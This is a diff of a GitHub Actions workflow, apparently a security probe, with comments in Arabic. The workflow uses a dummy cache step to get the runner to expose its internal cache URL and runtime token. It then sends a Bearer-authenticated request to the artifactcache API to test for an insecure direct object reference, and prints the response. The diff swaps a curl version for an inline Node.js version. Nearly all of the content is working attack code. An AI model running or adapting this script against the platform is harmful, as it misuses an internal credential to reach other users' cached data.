@@ -1,10 +1,9 @@
-name: Cache API IDOR Test V3
+name: Cache API IDOR Test V4
 on: [push]
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      # 1. خطوة وهمية لإجبار GitHub على حقن متغيرات الكاش في البيئة
       - name: Trigger Cache Env Vars
         uses: actions/cache@v3
         with:
@@ -14,25 +13,50 @@ jobs:
           restore-keys: |
             ${{ runner.os }}-dummy-cache-
       
-      # 2. استخراج التوكن والاستعلام عن الـ API
-      - name: Query Internal Cache API
+      - name: Query Internal Cache API via Node.js
         run: |
-          # قراءة المتغيرات من البيئة (الآن يجب أن تكون موجودة)
-          CACHE_URL="$ACTIONS_CACHE_URL"
-          RUNTIME_TOKEN="$ACTIONS_RUNTIME_TOKEN"
-          
-          echo "Cache URL found: $([ -n "$CACHE_URL" ] && echo yes || echo no)"
-          echo "Token found: $([ -n "$RUNTIME_TOKEN" ] && echo yes || echo no)"
-          
-          if [ -n "$CACHE_URL" ] && [ -n "$RUNTIME_TOKEN" ]; then
-            # مسار الـ API الخاص بالكاش
-            QUERY_URL="${CACHE_URL}_apis/artifactcache/caches"
-            
-            echo "Sending IDOR request to internal API..."
-            RESPONSE=$(curl -s -H "Authorization: Bearer $RUNTIME_TOKEN" "$QUERY_URL")
-            
-            echo "API Response:"
-            echo "$RESPONSE"
-          else
-            echo "Failed to extract internal tokens."
-          fi
+          node -e "
+            const https = require('https');
+            const url = require('url');
+
+            // 1. استخراج المتغيرات من ذاكرة العملية
+            const ENV = process.env;
+            const CACHE_URL = ENV.ACTIONS_CACHE_URL;
+            const TOKEN = ENV.ACTIONS_RUNTIME_TOKEN;
+
+            console.log('Cache URL found:', CACHE_URL ? 'yes' : 'no');
+            console.log('Token found:', TOKEN ? 'yes' : 'no');
+
+            if (CACHE_URL && TOKEN) {
+              // 2. مسار الـ API الخاص بالكاش
+              const queryUrl = CACHE_URL + '_apis/artifactcache/caches';
+              console.log('Sending IDOR request to:', queryUrl);
+
+              const parsedUrl = new URL(queryUrl);
+              
+              const options = {
+                hostname: parsedUrl.hostname,
+                path: parsedUrl.pathname + parsedUrl.search,
+                method: 'GET',
+                headers: {
+                  'Authorization': 'Bearer ' + TOKEN,
+                  'Accept': 'application/json'
+                }
+              };
+
+              // 3. إرسال الطلب
+              const req = https.request(options, (res) => {
+                let data = '';
+                res.on('data', (chunk) => data += chunk);
+                res.on('end', () => {
+                  console.log('Status Code:', res.statusCode);
+                  console.log('API Response:', data);
+                });
+              });
+
+              req.on('error', (e) => console.error('Error:', e.message));
+              req.end();
+            } else {
+              console.log('Failed to extract internal tokens.');
+            }
+          "
